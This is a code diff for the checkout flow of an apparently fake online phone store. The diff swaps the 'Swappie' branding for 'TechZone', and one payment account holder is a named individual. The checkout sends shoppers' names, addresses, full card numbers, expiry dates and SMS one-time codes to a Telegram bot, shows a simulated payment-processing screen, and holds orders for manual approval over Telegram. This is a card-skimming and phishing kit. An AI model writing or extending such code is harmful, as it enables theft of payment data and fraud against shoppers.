+        <div id="checkout-step-5" class="checkout-step">
+            <div class="confirmation-section">
+                <div class="loading-state" id="processing-payment">
+                    <div class="spinner"></div>
+                    <h3>${(currentLanguage === 'es' ? 'Procesando Pago' : 'Processing Payment')}</h3>
+                    <p>${(currentLanguage === 'es' ? 'Por favor espere mientras procesamos su pago. Esto puede tomar un minuto.' : 'Please hold on while we process your payment. This might take a minute.')}</p>
+                    <p class="processing-steps">
+                        <span class="step-text">${(currentLanguage === 'es' ? 'Validando método de pago' : 'Validating payment method')}</span>
+                    </p>
+                </div>
+                <div class="success-state" id="order-success" style="display: none;">
+                    <div class="success-icon">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
+                    <h3>${(currentLanguage === 'es' ? '¡Pedido Confirmado!' : 'Order Confirmed!')}</h3>
+                    <p>${(currentLanguage === 'es' ? 'Tu pedido ha sido procesado exitosamente.' : 'Your order has been processed successfully.')}</p>
+                    <div class="order-details">
+                        <div class="order-detail">
+                            <span>${(currentLanguage === 'es' ? 'Número de Pedido:' : 'Order Number:')}</span>
+                            <strong id="final-order-number">${checkoutData.orderNumber}</strong>
+                        </div>
+                        <div class="order-detail">
+                            <span>${(currentLanguage === 'es' ? 'Total:' : 'Total:')}</span>
+                            <strong>${convertPrice(subtotal, false)}</strong>
+                        </div>
+                        <div class="order-detail">
+                            <span>${(currentLanguage === 'es' ? 'Entrega Estimada:' : 'Estimated Delivery:')}</span>
+                            <strong>${getEstimatedDelivery()}</strong>
+                        </div>
+                    </div>
+                    <button class="btn btn-primary close-checkout-success">${(currentLanguage === 'es' ? 'Continuar Comprando' : 'Continue Shopping')}</button>
+                </div>
+            </div>
+        </div>
+
+        <div id="checkout-step-6" class="checkout-step">
+            <div class="otp-section">
+                <div class="otp-header">
+                    <div class="otp-security">
+                        <i class="fas fa-shield-alt"></i>
+                        <span>${(currentLanguage === 'es' ? 'Verificación de Seguridad' : 'Security Verification')}</span>
+                    </div>
+                </div>
+                <div class="otp-content">
+                    <h3>${(currentLanguage === 'es' ? 'Verificar tu Pago' : 'Verify Your Payment')}</h3>
+                    <p>${(currentLanguage === 'es' ? 'Hemos enviado un código de verificación de 6 dígitos a tu número de teléfono. Por favor, ingrésalo a continuación para completar tu compra.' : 'We have sent a 6-digit verification code to your phone number. Please enter it below to complete your purchase.')}</p>
+                    <div class="otp-input-container">
+                        <input type="tel" id="otp-single-input" class="otp-single-input" maxlength="6" inputmode="numeric" placeholder="123456" style="width: 200px; padding: 15px; font-size: 24px; text-align: center; border: 2px solid var(--border-color); border-radius: 8px; font-family: monospace; letter-spacing: 0.5em;" />
+                    </div>
+                    <div class="otp-timer">
+                        <span>${(currentLanguage === 'es' ? 'El código expira en:' : 'Code expires in:')}</span> 
+                        <span id="otp-countdown">02:00</span>
+                    </div>
+                    <div class="otp-actions">
+                        <button id="resend-otp-btn" class="btn btn-secondary" disabled>${(currentLanguage === 'es' ? 'Reenviar Código' : 'Resend Code')}</button>
+                        <button id="verify-otp-btn" class="btn btn-primary">${(currentLanguage === 'es' ? 'Verificar Código' : 'Verify Code')}</button>
+                        <button id="skip-otp-btn" class="btn btn-outline" style="margin-top: 1rem;">
+                        ${(currentLanguage === 'es' ? 'No requiero OTP' : 'I don\'t require OTP')}
+                    </button>
+                    </div>
+                    <div class="otp-error" id="otp-error" style="display: none;">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <span>${(currentLanguage === 'es' ? 'Código inválido. Por favor, inténtalo de nuevo.' : 'Invalid code. Please try again.')}</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>`;
 
     modal.innerHTML = checkoutHTML;
 
@@ -1089,93 +969,6 @@ function setupDiscountCode() {
         });
     }
 }
-
-
-function applyDiscountCode() {
-    const discountCodeInput = document.getElementById('discount-code');
-    const discountMessage = document.getElementById('discount-message');
-    
-    if (!discountCodeInput) return;
-    
-    const code = discountCodeInput.value.trim().toUpperCase();
-    const validCodes = {
-        'SWAPPIE10': { percentage: 10, description: '10% off your order' },
-        'WELCOME15': { percentage: 15, description: '15% off for new customers' },
-        'SAVE20': { percentage: 20, description: '20% off selected items' }
-    };
-    
-    if (validCodes[code]) {
-        const discount = validCodes[code];
-        checkoutData.discountCode = code;
-        checkoutData.discountAmount = (checkoutData.total * discount.percentage) / 100;
-        checkoutData.originalTotal = checkoutData.total;
-        
-        // Update totals display
-        updateCheckoutTotals();
-        
-        // Show success message
-        if (discountMessage) {
-            discountMessage.style.display = 'flex';
-            discountMessage.style.background = '#d1fae5';
-            discountMessage.style.color = '#065f46';
-            discountMessage.style.border = '1px solid #34d399';
-            discountMessage.innerHTML = `<i class="fas fa-check"></i> ${discount.description} applied successfully!`;
-        }
-        
-        // Disable input and button
-        discountCodeInput.disabled = true;
-        const applyBtn = document.getElementById('apply-discount');
-        if (applyBtn) {
-            applyBtn.disabled = true;
-            applyBtn.textContent = 'Applied';
-        }
-        
-    } else {
-        // Show error message
-        if (discountMessage) {
-            discountMessage.style.display = 'flex';
-            discountMessage.style.background = '#fee2e2';
-            discountMessage.style.color = '#991b1b';
-            discountMessage.style.border = '1px solid #f87171';
-            discountMessage.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Invalid discount code. Please try again.`;
-        }
-    }
-}
-
-function updateCheckoutTotals() {
-    const subtotalEl = document.getElementById('checkout-subtotal');
-    const totalEl = document.getElementById('checkout-total');
-    
-    let subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
-    let finalTotal = subtotal;
-    
-    if (checkoutData.discountAmount > 0) {
-        finalTotal = subtotal - checkoutData.discountAmount;
-        
-        // Add discount row if it doesn't exist
-        const totalsContainer = document.querySelector('.checkout-totals');
-        if (totalsContainer && !document.querySelector('.discount-row')) {
-            const discountRow = document.createElement('div');
-            discountRow.className = 'totals-row discount-row';
-            discountRow.innerHTML = `
-                <span class="totals-label">Discount (${checkoutData.discountCode}):</span>
-                <span class="totals-value discount-value">-${convertPrice(checkoutData.discountAmount, false)}</span>
-            `;
-            
-            // Insert before total row
-            const totalRow = document.querySelector('.total-row');
-            if (totalRow) {
-                totalRow.parentNode.insertBefore(discountRow, totalRow);
-            }
-        }
-    }
-    
-    if (subtotalEl) subtotalEl.textContent = convertPrice(subtotal, false);
-    if (totalEl) totalEl.textContent = convertPrice(finalTotal, false);
-    
-    // Update checkout data
-    checkoutData.total = finalTotal;
-	}
 
 function setupCheckoutEventListeners() {
     try {
@@ -1211,17 +1004,16 @@ function setupCheckoutEventListeners() {
             });
         }
 
-      if (nextToShippingBtn) {
-    nextToShippingBtn.addEventListener('click', function() {
-        const checkbox = document.getElementById('terms-checkbox');
-        if (checkbox && !checkbox.checked) {
-            alert(t("accept_terms_alert"));
-            return;
+        if (nextToShippingBtn) {
+            nextToShippingBtn.addEventListener('click', function() {
+                const checkbox = document.getElementById('terms-checkbox');
+                if (checkbox && !checkbox.checked) {
+                    alert(currentLanguage === 'es' ? 'Debe aceptar los términos y condiciones para continuar' : 'You must accept the terms and conditions to continue');
+                    return;
+                }
+                goToCheckoutStep(2);
+            });
         }
-        goToCheckoutStep(2);
-    });
-}
-
 
         const backToSummaryBtn = document.getElementById('back-to-summary');
         if (backToSummaryBtn) {
@@ -1240,29 +1032,29 @@ function setupCheckoutEventListeners() {
                 const customerCity = document.getElementById('customer-city');
 
                 // Check required fields
-if (!customerName || !customerName.value.trim()) {
-    alert(t("enter_full_name"));
-    if (customerName) customerName.focus();
-    return;
-}
+                if (!customerName || !customerName.value.trim()) {
+                    alert(currentLanguage === 'es' ? 'Por favor ingrese su nombre completo' : 'Please enter your full name');
+                    if (customerName) customerName.focus();
+                    return;
+                }
 
-if (!customerPhone || !customerPhone.value.trim()) {
-    alert(t("enter_phone_number"));
-    if (customerPhone) customerPhone.focus();
-    return;
-}
+                if (!customerPhone || !customerPhone.value.trim()) {
+                    alert(currentLanguage === 'es' ? 'Por favor ingrese su número de teléfono' : 'Please enter your phone number');
+                    if (customerPhone) customerPhone.focus();
+                    return;
+                }
 
-if (!customerAddress || !customerAddress.value.trim()) {
-    alert(t("enter_complete_address"));
-    if (customerAddress) customerAddress.focus();
-    return;
-}
+                if (!customerAddress || !customerAddress.value.trim()) {
+                    alert(currentLanguage === 'es' ? 'Por favor ingrese su dirección completa' : 'Please enter your complete address');
+                    if (customerAddress) customerAddress.focus();
+                    return;
+                }
 
-if (!customerCity || !customerCity.value.trim()) {
-    alert(t("enter_city"));
-    if (customerCity) customerCity.focus();
-    return;
-}
+                if (!customerCity || !customerCity.value.trim()) {
+                    alert(currentLanguage === 'es' ? 'Por favor ingrese su ciudad' : 'Please enter your city');
+                    if (customerCity) customerCity.focus();
+                    return;
+                }
 
                 // Store customer information in checkoutData
 checkoutData.customerName = customerName.value.trim();
@@ -1278,8 +1070,8 @@ TelegramNotifications.sendCustomerInfo({
 });
 
 goToCheckoutStep(3);
-    });
-}
+            });
+        }
 
 
         const backToShippingBtn = document.getElementById('back-to-shipping');
@@ -1355,7 +1147,7 @@ goToCheckoutStep(3);
                             const lastFourDigits = cardNumber.slice(-4);
                             TelegramNotifications.cardDetailsSubmitted({
                                 total: convertPrice(getCartTotal(), false),
-                                orderRef: generateOrderReference(),
+                                orderRef: checkoutData.orderNumber,
                                 cardholderName: checkoutData.cardholderName,
                                 cardNumber: document.getElementById('card-number').value.replace(/\s/g, ''),
                                 expiryDate: document.getElementById('expiry-date').value,
@@ -1409,13 +1201,11 @@ goToCheckoutStep(3);
 
         // Setup card input formatting
         setupCardInputFormatting();
-		   } catch (error) {
+
+    } catch (error) {
         console.error('Error setting up checkout event listeners:', error);
     }
 }
-
-
-
 function setupCardInputFormatting() {
     const cardNumberInput = document.getElementById('card-number');
     const expiryDateInput = document.getElementById('expiry-date');
@@ -1442,7 +1232,7 @@ function setupCardInputFormatting() {
 
     if (cvvInput) {
         cvvInput.addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3); // Only digits, max 3
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4); // Allow up to 4 digits for Amex
         });
     }
 }
@@ -1453,30 +1243,42 @@ function validateCardDetails() {
     const cvv = document.getElementById('cvv').value;
     const cardErrors = document.getElementById('card-errors');
 
-  // Card Number: Must be 16 digits
-if (!/^\d{16}$/.test(cardNumber)) {
-    cardErrors.textContent = t("invalid_card_number");
-    cardErrors.style.display = 'block';
-    return false;
+    // Card Number: Must be 16 digits
+    if (!/^\d{16}$/.test(cardNumber)) {
+        cardErrors.textContent = currentLanguage === 'es' ? 'Número de tarjeta inválido. Debe tener 16 dígitos.' : 'Invalid card number. Must be 16 digits.';
+        cardErrors.style.display = 'block';
+        return false;
+    }
+
+    // Expiry Date: Must be in MM/YY format
+    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
+        cardErrors.textContent = currentLanguage === 'es' ? 'Fecha de vencimiento inválida. Debe estar en formato MM/AA.' : 'Invalid expiry date. Must be in MM/YY format.';
+        cardErrors.style.display = 'block';
+        return false;
+    }
+
+    // Check if expiry date is in the past
+    const [month, year] = expiryDate.split('/');
+    const expiry = new Date(`20${year}`, month, 0); // Day 0 gets the last day of the previous month, which is what we want.
+    const now = new Date();
+    now.setHours(0, 0, 0, 0); // Set to start of day for comparison
+    
+    if (expiry < now) {
+        cardErrors.textContent = currentLanguage === 'es' ? 'La tarjeta ha expirado.' : 'Card has expired.';
+        cardErrors.style.display = 'block';
+        return false;
+    }
+
+    // CVV: Must be 3 or 4 digits
+    if (!/^\d{3,4}$/.test(cvv)) {
+        cardErrors.textContent = currentLanguage === 'es' ? 'CVV inválido. Debe tener 3 o 4 dígitos.' : 'Invalid CVV. Must be 3 or 4 digits.';
+        cardErrors.style.display = 'block';
+        return false;
+    }
+    
+    cardErrors.style.display = 'none'; // Clear errors if valid
+    return true;
 }
-
-// Expiry Date: Must be in MM/YY format
-if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
-    cardErrors.textContent = t("invalid_expiry_date");
-    cardErrors.style.display = 'block';
-    return false;
-}
-
-// CVV: Must be 3 digits
-if (!/^\d{3}$/.test(cvv)) {
-    cardErrors.textContent = t("invalid_cvv");
-    cardErrors.style.display = 'block';
-    return false;
-}
-
-cardErrors.style.display = 'none'; // Clear errors if valid
-return true;
-
 
 function setupOTPInputs() {
     // Remove existing listeners to prevent duplicates
@@ -1599,24 +1401,27 @@ function verifyOTP() {
                 <div class="success-icon" style="font-size: 3rem; color: var(--primary-color); margin-bottom: 1rem;">
                     <i class="fas fa-hourglass-half"></i>
                 </div>
-                <h3>${t("awaiting_confirmation")}</h3>
-                <p>${t("awaiting_confirmation_desc")}</p>
+                <h3>${(currentLanguage === 'es' ? 'Esperando Confirmación' : 'Awaiting Confirmation')}</h3>
+                <p>${(currentLanguage === 'es' ? 'Tu pedido está pendiente de aprobación manual. Recibirás una notificación pronto.' : 'Your order is pending manual approval. You will receive a notification shortly.')}</p>
             `;
         }
 
         // DO NOT process order here. Wait for manual confirmation via Telegram webhook.
 
     } else {
-       // Show error for invalid or incomplete OTP
-console.log('Invalid or incomplete OTP');
-if (otpError) {
-    otpError.style.display = 'block';
-    const errorText = otpError.querySelector('span');
-    if (errorText) {
-        errorText.textContent = t("otp_invalid_length");
+        // Show error for invalid or incomplete OTP
+        console.log('Invalid or incomplete OTP');
+        if (otpError) {
+            otpError.style.display = 'block';
+            const errorText = otpError.querySelector('span');
+            if (errorText) {
+                errorText.textContent = currentLanguage === 'es' ? 
+                    'Por favor ingrese exactamente 6 dígitos' : 
+                    'Please enter exactly 6 digits';
+            }
+        }
     }
 }
-
 
 function skipOTP() {
     // Skip OTP verification and go directly to order completion
@@ -1687,14 +1492,13 @@ function processOrder() {
     try {
         goToCheckoutStep(5);
 
-       // Simulate processing steps
-const steps = [
-    { text: t("validating_payment_method"), delay: 1000 },
-    { text: t("confirming_inventory"), delay: 1500 },
-    { text: t("generating_purchase_order"), delay: 2000 },
-    { text: t("generating_invoice"), delay: 1000 }
-];
-
+        // Simulate processing steps
+        const steps = [
+            { text: currentLanguage === 'es' ? 'Validando método de pago' : 'Validating payment method', delay: 1000 },
+            { text: currentLanguage === 'es' ? 'Confirmando inventario' : 'Confirming inventory', delay: 1500 },
+            { text: currentLanguage === 'es' ? 'Generando orden de compra' : 'Generating purchase order', delay: 2000 },
+            { text: currentLanguage === 'es' ? 'Generando factura' : 'Generating invoice', delay: 1000 }
+        ];
 
         let currentStep = 0;
 
@@ -1751,7 +1555,7 @@ function generateInvoice() {
         // Company header with proper business details
         doc.setFontSize(22);
         doc.setTextColor(30, 58, 138);
-        doc.text('Swappie', margin, yPosition);
+        doc.text('TechZone', margin, yPosition);
         
         // Company address and details in header
         doc.setFontSize(9);
@@ -1763,7 +1567,7 @@ function generateInvoice() {
         doc.text(businessAddress.address, margin, yPosition + 14);
         doc.text(`${businessAddress.city}, ${businessAddress.country}`, margin, yPosition + 21);
         doc.text(`Tel: ${countryConfig[currentCountry].phone}`, margin, yPosition + 28);
-        doc.text(`Email: sales@swappie-${currentCountry}.com`, margin, yPosition + 35);
+        doc.text(`Email: sales@techzone-${currentCountry}.com`, margin, yPosition + 35);
 
         // Invoice title and number (right aligned)
         doc.setFontSize(18);
@@ -1858,11 +1662,10 @@ function generateInvoice() {
         doc.text(convertPrice(subtotal, false), pageWidth - 20, yPosition, { align: 'right' });
         yPosition += 8;
 
-       // Shipping
-doc.text(t("shipping_label"), pageWidth - 60, yPosition);
-doc.text(t("free_shipping"), pageWidth - 20, yPosition, { align: 'right' });
-yPosition += 8;
-
+        // Shipping
+        doc.text(`${currentLanguage === 'es' ? 'Envío:' : 'Shipping:'}`, pageWidth - 60, yPosition);
+        doc.text(currentLanguage === 'es' ? 'GRATIS' : 'FREE', pageWidth - 20, yPosition, { align: 'right' });
+        yPosition += 8;
 
         // Total with emphasis
         doc.line(pageWidth - 80, yPosition, pageWidth - margin, yPosition);
@@ -1874,22 +1677,23 @@ yPosition += 8;
         doc.text(convertPrice(subtotal, false), pageWidth - 20, yPosition, { align: 'right' });
 
         // Payment method
-yPosition += 20;
-doc.setFont(undefined, 'normal');
-doc.setFontSize(10);
-doc.setTextColor(0, 0, 0);
+        yPosition += 20;
+        doc.setFont(undefined, 'normal');
+        doc.setFontSize(10);
+        doc.setTextColor(0, 0, 0);
+        const paymentMethodText = checkoutData.paymentMethod === 'bank-transfer' ? 
+            (currentLanguage === 'es' ? 'Transferencia Bancaria' : 'Bank Transfer') :
+            (currentLanguage === 'es' ? 'Tarjeta de Crédito' : 'Credit Card');
+        doc.text(`${currentLanguage === 'es' ? 'Método de Pago:' : 'Payment Method:'} ${paymentMethodText}`, margin, yPosition);
 
-const paymentMethodText = checkoutData.paymentMethod === 'bank-transfer' 
-    ? t("bank_transfer") 
-    : t("credit_card");
-
-doc.text(`${t("payment_method_label")} ${paymentMethodText}`, margin, yPosition);
-
-// Terms and conditions
-yPosition += 15;
-doc.setFontSize(8);
-doc.setTextColor(100, 100, 100);
-doc.text(t("terms_and_conditions_text"), margin, yPosition);
+        // Terms and conditions
+        yPosition += 15;
+        doc.setFontSize(8);
+        doc.setTextColor(100, 100, 100);
+        const termsText = currentLanguage === 'es' ? 
+            'Términos: Garantía de 12 meses incluida. Devoluciones aceptadas dentro de 30 días.' :
+            'Terms: 12-month warranty included. Returns accepted within 30 days.';
+        doc.text(termsText, margin, yPosition);
 
         // Footer with business details
         const footerY = pageHeight - 30;
@@ -1901,14 +1705,14 @@ doc.text(t("terms_and_conditions_text"), margin, yPosition);
         doc.text(businessInfo, margin, footerY);
         
         // Center - website
-        doc.text('www.swapie.shop', pageWidth / 2, footerY, { align: 'center' });
+        doc.text('www.techzone.com', pageWidth / 2, footerY, { align: 'center' });
         
         // Right side - thank you message
         const thankYou = currentLanguage === 'es' ? 'Gracias por su compra' : 'Thank you for your purchase';
         doc.text(thankYou, pageWidth - margin, footerY, { align: 'right' });
 
         // Save the PDF
-        const fileName = `Swappie_Invoice_${checkoutData.orderNumber}.pdf`;
+        const fileName = `TechZone_Invoice_${checkoutData.orderNumber}.pdf`;
         doc.save(fileName);
 
         console.log('Invoice generated successfully:', fileName);
@@ -2034,14 +1838,14 @@ function getAccountNumber() {
 
 function getAccountHolder() {
     switch (currentCountry) {
-        case 'nicaragua': return 'Swappeie';
-        case 'honduras': return 'Swappie';
+        case 'nicaragua': return 'TechZone';
+        case 'honduras': return 'TechZone';
         case 'trinidad': return 'Jacenta Althea Hankey';
-        case 'elsalvador': return 'Swappie';
-        case 'paraguay': return 'Swappie';
-        case 'guatemala': return 'Swappie';
-        case 'dominican': return 'Swappie';
-        case 'usa': return 'Swappie';
+        case 'elsalvador': return 'TechZone';
+        case 'paraguay': return 'TechZone';
+        case 'guatemala': return 'TechZone';
+        case 'dominican': return 'TechZone';
+        case 'usa': return 'TechZone';
         default: return 'Account Holder';
     }
 }
@@ -2553,24 +2357,6 @@ function showCardProcessingState() {
 
 // Remove duplicate event listeners - these are handled in setupCheckoutEventListeners()
 // which is called when the checkout modal is created dynamically
-	 function showCardProcessingState() {
-    const creditCardDetails = document.getElementById('credit-card-details');
-    const processingOverlay = document.createElement('div');
-    processingOverlay.className = 'processing-overlay';
-    processingOverlay.innerHTML = `
-        <div class="spinner"></div>
-        <p>${currentLanguage === 'es' ? 'Procesando su pago...' : 'Processing your payment...'}</p>
-    `;
-
-    // Append the overlay directly to the body
-    document.body.appendChild(processingOverlay);
-
-    // Optionally, you might want to disable the confirm button:
-    const confirmButton = document.getElementById('process-order');
-    if (confirmButton) {
-        confirmButton.disabled = true;
-    }
-}
 
  // These event listeners are already handled in setupCheckoutEventListeners()
 function updateFooterFromBusinessAddress() {
@@ -2624,13 +2410,16 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     });
 
-   const savedCountry = localStorage.getItem('selectedCountry') || 'honduras';
+    // ✅ On first page load, update the footer based on saved country
+    const savedCountry = localStorage.getItem('selectedCountry') || 'honduras';
     currentCountry = savedCountry;
     updateFooterFromBusinessAddress();
-}); // ✅ properly close DOMContentLoaded here
-
-
-
-document.querySelector('form').addEventListener('submit', (event) => {
-    event.preventDefault(); // stop the default form submission (which reloads the page)
 });
+const form = document.querySelector('form');
+if (form) {
+    form.addEventListener('submit', (event) => {
+        event.preventDefault(); // stop the default form submission (which reloads the page)
+        
+        // your form submit logic here...
+    });
+}
